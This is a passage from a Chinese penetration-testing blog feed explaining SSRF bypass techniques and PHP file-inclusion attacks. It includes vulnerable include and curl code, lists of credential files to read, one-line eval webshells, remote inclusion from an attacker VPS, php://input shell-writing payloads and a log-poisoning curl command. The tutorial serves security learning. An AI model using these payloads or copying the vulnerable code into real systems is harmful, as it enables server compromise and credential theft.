      <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p><code>curl_exec</code>函数用于<strong>执行指定的CURL会话</strong>，默认不跟踪跳转。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">// CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SSRF常见种类"><a href="#SSRF常见种类" class="headerlink" title="SSRF常见种类"></a>SSRF常见种类</h2><ul><li><p><strong>远程下载SSRF</strong>：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</p></li><li><p><strong>布尔型SSRF</strong>：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</p></li><li><p><strong>无回显SSRF</strong>：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，<u>无法用来探测内网</u>，只能配合其他信息泄露来盲打内网。<u>单独存在没有危害</u>。</p></li></ul><h2 id="SSRF漏洞-防御-amp-绕过姿势"><a href="#SSRF漏洞-防御-amp-绕过姿势" class="headerlink" title="SSRF漏洞(防御&amp;绕过姿势)"></a>SSRF漏洞(防御&amp;绕过姿势)</h2><p><strong>常见防御方法</strong>：</p><ol><li>设置<strong>协议头的白名单</strong>或黑名单，过滤除了HTTP和HTTPS之外的所有协议头</li><li>设置<strong>URL的白名单</strong>或黑名单（比如百度翻译：不允许访问DNSlog和bbc）</li><li>设置访问IP的白名单或黑名单，过滤访问的IP（看需求）</li><li>限制请求的端口为http的常用端口，比如：80、443、8080等</li><li>后台代码对请求来源进行验证</li><li>统一错误信息，避免用户根据错误信息来判断远程服务器的端口状态</li></ol><p><strong>绕过方法：</strong></p><p>参考：<a href="https://www.t00ls.com/articles-41070.html">https://www.t00ls.com/articles-41070.html</a></p><ul><li><p><strong>@</strong></p><p><code>http://abc@127.0.0.1</code> 实际上是以用户名abc连接到站点127.0.0.1。</p><p>在对@解析域名中，不同的处理函数存在处理差异，如：对于<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，PHP的<code>parse_url</code>会识别为<code>www.ccc.com</code>，而<code>libcurl</code>则会识别为<code>www.bbb.com</code>。</p></li><li><p><strong>利用[::]</strong></p><p>可以利用<code>[::]</code>来绕过localhost。比如<code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></p></li><li><p>句号</p><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p></li><li><p><strong>添加端口号</strong></p><p>比如：<code>http://127.0.0.1:8080</code>。</p></li></ul><p>禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址。</p><p>绕过：</p><ul><li><p><strong>短网址绕过</strong></p><p>站长工具短网址：<a href="http://tool.chinaz.com/tools/dwz.aspx">http://tool.chinaz.com/tools/dwz.aspx</a> </p><p>百度短网址：<a href="http://dwz.cn/">http://dwz.cn/</a></p></li><li><p><strong>利用特殊域名<code>xip.io</code></strong></p><p>原理是DNS解析。<code>xip.io</code>可以指向任意域名，即<code>127.0.0.1.xip.io</code>，可解析为<code>127.0.0.1</code>。</p></li><li><p><strong>IP限制绕过</strong></p><p>十进制转换 八进制转换 十六进制转换 不同进制组合转换</p><p>127.0.0.1 八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433</p></li><li><p><strong>协议限制绕过</strong></p><p>禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求。</p><p>当url协议限定只为http(s)时，可以利用follow redirect 特性构造302跳转服务，使用<code>https://tinyurl.com</code>生成302跳转地址，再结合<code>dict://</code> <code>file://</code> <code>gopher://</code>构造攻击。</p></li><li><p><strong>DNS重绑定</strong>可以利用于ssrf绕过 ，bypass 同源策略等，，，这里介绍三种方法</p><ol><li>特定域名实现TTL&#x3D;0</li><li>域名绑定两条A记录</li><li>自建DNS服务器</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://frankcao3.github.io/posts/59563"/>
    <id>https://frankcao3.github.io/posts/59563</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:01:05.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628991158390-b5543660-8083-4e31-9a9d-16edbbf6a1f0.png" alt="img"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>文件包含：</strong></p><p>文件包含即程序通过 <strong>包含函数</strong> 调用本地或远程文件，<strong>将文件内容作为脚本执行</strong>，以此来实现拓展功能。</p><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p><strong>文件包含漏洞原理</strong>:</p><p>文件包含漏洞是指<strong>当服务器php.ini文件中开启<code>allow_url_include</code>选项时</strong>，就可以通过PHP的某些特性函数，比如<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>，利用URL去动态包含文件，<strong>让当前页面去执行指定的另外一个文件中的代码内容</strong>。此时如果没有对文件来源进行严格审查，就会导致任意文件读取。黑客将很有可能让当前页面去执行超出 Web 目录中的文件，或者是 Web 目录中不希望被执行的敏感文件，甚至是远程服务器上的文件。</p><p>几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞<strong>在 PHP 中居多</strong>，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件包含各个脚本代码</span></span><br><span class="line">ASP,PHP,JSP,ASPX等</span><br><span class="line"></span><br><span class="line">&lt;!-—<span class="comment">#include file=&quot;1.asp&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;top.aspx&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;c:import url=<span class="string">&quot;http://lthief.one/1.jsp&quot;</span>&gt;    <span class="comment">// 远程文件包含</span></span><br><span class="line"></span><br><span class="line">&lt;jsp:<span class="keyword">include</span> page=<span class="string">&quot;head.jsp&quot;</span> / &gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="keyword">include</span> file=<span class="string">&quot;head.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span> (<span class="string">&#x27;test.php&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ul><li><p><strong>白盒</strong></p><p>代码审计</p></li><li><p><strong>黑盒</strong></p><p>漏洞扫描工具；</p><p>公开漏洞；</p><p>手工查看参数值和功能点（看是不是接收一个文件名作为参数，或者该功能的实现会不会涉及include()之类的函数）。</p></li></ul><h2 id="PHP中常见包含文件的函数"><a href="#PHP中常见包含文件的函数" class="headerlink" title="PHP中常见包含文件的函数"></a>PHP中常见包含文件的函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>当使用该函数包含文件时，只有代码执行到<code>include()</code>函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://127.0.0.1:8080/include.php?filename=index.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$filename=$_GET[&#x27;filename&#x27;];</span></span><br><span class="line"><span class="comment">include ( $filename.&quot; .html&quot; );  // 文件后缀名增加了一个HTML作为限制</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如访问服务器本地1.txt的内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805084014410.png" alt="image-20220805084014410"></p><h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h3><p>功能与<code>include()</code>相同，区别在于<u>当重复调用同一文件时，程序只调用一次</u>。</p><h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p><code>require()</code>与<code>include()</code>的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>被包含的文件在<strong>服务器本地</strong>。</p><p><strong>利用条件：</strong></p><p><code>allow_url_include = On</code> </p><p>比如，以get请求实施文件包含攻击，查看服务器本地文件：<code>?page=a.php</code>、<code>?home=b.html</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// windows server</span><br><span class="line"></span><br><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\XX\httpd.conf  Apache配置信息</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br><span class="line"></span><br><span class="line">// Linux/Unix</span><br><span class="line"></span><br><span class="line">/etc/passwd 账户信息</span><br><span class="line">/etc/shadow  账户密码文件</span><br><span class="line">/etc/httpd/conf/httpd.conf  Apache配置文件</span><br><span class="line">/etc/my.conf  mysql 配置文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf  Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf   虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini PHP相关配置</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>利用条件：</strong></p><p><code>allow_url_fopen = On</code> 是否允许将URL（HTTP，HTTPS等）作为文件打开处理</p><p><code>allow_url_include = On</code> 是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件解析处理</p><p>远程文件包含漏洞是因为开启了PHP配置中的<code>allow_url_fopen</code>选项，选项开启之后，<strong>服务器允许包含一个远程文件</strong>，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><p>比如使用 <code>http://192.168.75.138/shell.php</code> 来替换原 URL 中包含的文件名，可以远程执行 PHP 脚本。shell.php可以是一个一句话木马。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804213230082.png" alt="image-20220804213230082"></p><h2 id="x3D-x3D-PHP伪协议-x3D-x3D-（重要）"><a href="#x3D-x3D-PHP伪协议-x3D-x3D-（重要）" class="headerlink" title="&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）"></a>&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p><strong>各协议的利用条件和方法：</strong></p><p>参考：<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png" alt="img"></p><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>php 涉及到文件以及协议的地方默认使用 file 协议，如果没有写出协议名或者协议不存在，都会被当成 file 协议来解析。</p><p><code>file://[文件的绝对路径和文件名]</code></p><p>不受allow_url_fopen、allow_url_include 开启的限制。</p><p>如：<code>?a=file://C:/Windows/win.ini</code></p><h3 id="http-x2F-x2F-、ftp-x2F-x2F"><a href="#http-x2F-x2F-、ftp-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;</h3><p>访问 HTTP(s) 网址、访问 FTP(s) URLs。允许通过 HTTP 1.0 的 GET方法，以 <strong>只读</strong> 访问文件或资源，通常用于远程包含。</p><p><strong>需要allow_url_fopen &#x3D; On、allow_url_include &#x3D; On。</strong></p><p>比如包含木马文件<code>?a=http://vps.vps.vps.vps/shell.php</code></p><p>木马文件（shell.txt）内容：<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></p><h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a><strong>php:&#x2F;&#x2F;</strong></h3><p>访问各个输入&#x2F;输出流（I&#x2F;O streams）。经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。</p><p>包括<code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>、<code>php://input</code>、<code>php://output</code>、<code>php://filter</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code> 九种。</p><ul><li><p><strong>php:&#x2F;&#x2F;input</strong></p><p>访问请求的原始数据的只读流，将post请求的数据当作php代码 <strong>执行</strong>。注意<code>enctype=“multipart/form-data”</code> 的时候<code>php://input</code>是无效的。</p><p><strong>需要allow_url_include &#x3D; On，但是不受 allow_url_fopen 影响。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">GetShell：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;hack.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]) ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094122145.png" alt="image-20220805094122145"></p></li><li><p><strong>php:&#x2F;&#x2F;filter</strong></p><p>数据流打开时的筛选过滤应用，<strong>读取&#x2F;解析</strong> 本地源代码。</p><p>不受 allow_url_fopen、allow_url_include 影响。</p><p><em>用于读取文件（增加base64编码）：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">// 将php文件通过base64编码读出（&quot;read=&quot;可以省略），若不用base64编码，php文件就会作为脚本执行，无法输出源代码。</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">//读取文件源码</span><br></pre></td></tr></table></figure><p><em>用于解析（执行）文件，可用于getshell：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用于GetShell（shell.txt需通过文件上传在目标服务器上）：</span><br><span class="line">木马文件（shell.txt）内容：&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">然后菜刀连接 http://localhost/test.php?file=php://filter/resource=./1.txt 即可。</span><br></pre></td></tr></table></figure></li></ul><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p><strong>需要allow_url_fopen&#x3D;On，allow_url_include&#x3D;On。</strong></p><p>将data:&#x2F;&#x2F;所指内容 <strong>执行</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,待执行的文本内容</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo(); ?&gt;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094336370.png" alt="image-20220805094336370"></p><h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://D:/phpStudy/WWW/file.zip%23code.txt</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的子文件名]</span><br><span class="line">注：文件路径必须为绝对路径；zip文件后缀名可以改为其他如图片后缀；#进行url编码为%23</span><br></pre></td></tr></table></figure><h3 id="zlib-x2F-x2F-、bzip2-x2F-x2F"><a href="#zlib-x2F-x2F-、bzip2-x2F-x2F" class="headerlink" title="zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=compress.zlib://file.zip</span><br><span class="line">注：文件路径无绝对路径限制；zlib://协议文件压缩为zip或gz都可以，bzip2://协议文件压缩为bz2；后缀名也可以改为其他，如图片后缀</span><br></pre></td></tr></table></figure><h2 id="各种文件包含"><a href="#各种文件包含" class="headerlink" title="各种文件包含"></a>各种文件包含</h2><h3 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>利用网站报错日志写入木马程序。</p><p>流程如下：</p><ul><li>首先需要找到日志文件的存储位置</li><li>借助报错，往日志文件写木马</li><li>使用工具（菜刀或者蚁剑）连接</li></ul><h3 id="包含上传文件（先上传，后包含）"><a href="#包含上传文件（先上传，后包含）" class="headerlink" title="包含上传文件（先上传，后包含）"></a>包含上传文件（先上传，后包含）</h3><p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code>。</p><p>图片代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;pass&#x27;]);?&gt;&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</strong>。</p><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p><p>前提是知道日志的物理存放路径。</p><p><strong>日志默认路径</strong></p><ol><li><p><strong>apache+Linux日志默认路径</strong></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/access_log  </span><br><span class="line">    /var/log/httpd/access_log</span><br></pre></td></tr></table></figure></li><li><p><strong>apache+win2003日志默认路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+win2003 默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure></li><li><p><strong>nginx 日志文件</strong></p><p>日志文件在用户安装目录logs目录下。以我的安装路径为例<code>/usr/local/nginx</code>，那我的日志目录就是在<code>/usr/local/nginx/logs</code>里。</p></li></ol><p><strong>web中间件默认配置</strong></p><ol><li><p><strong>apache+linux 默认配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">index.php?page=/etc/init.d/httpd</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003 配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/system32/inetsrv/metabase.xml</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+WIN 配置文件</strong></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure><p><strong>curl 构造一句话，写入日志文件测试记录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;http://127.0.0.1/php/1.php?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>可以先尝试包含到session文件，再根据session文件内容寻找可控变量，再构造payload插入到文件中，最后包含即可。</p><p><strong>前提</strong></p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p>session常见存储路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</span><br></pre></td></tr></table></figure><h3 id="包含-x2F-pros-x2F-self-x2F-environ"><a href="#包含-x2F-pros-x2F-self-x2F-environ" class="headerlink" 